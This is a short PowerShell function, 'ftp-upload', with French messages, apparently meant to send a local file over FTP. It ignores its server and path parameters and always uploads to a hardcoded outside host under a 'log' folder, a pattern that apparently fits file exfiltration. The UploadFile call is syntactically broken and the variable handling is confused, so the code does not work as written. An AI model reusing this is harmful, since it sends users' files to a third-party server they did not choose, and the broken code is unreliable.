function ftp-upload {
    param (
        [string]$ftpServer,
        [string]$remotePath,
        [string]$ftpUsername,
        [string]$ftpPassword,
        [string]$fileupload
    )

    try {
        $outputFile = Split-Path $fileupload -leaf
    
		$fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8
	
        $webClient = New-Object System.Net.WebClient
        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        
        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, $fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8))

        Write-Host "Le fichier a été uploadé avec succès."
    }
    catch {
        Write-Host "Chemin de fileupload : $fileupload"
        Write-Host "outpufile  : $outputFile"
        Write-Host "Erreur lors de l'upload du fichier : $_.Exception.Message"
    }
    finally {
        $webClient.Dispose()
    }
}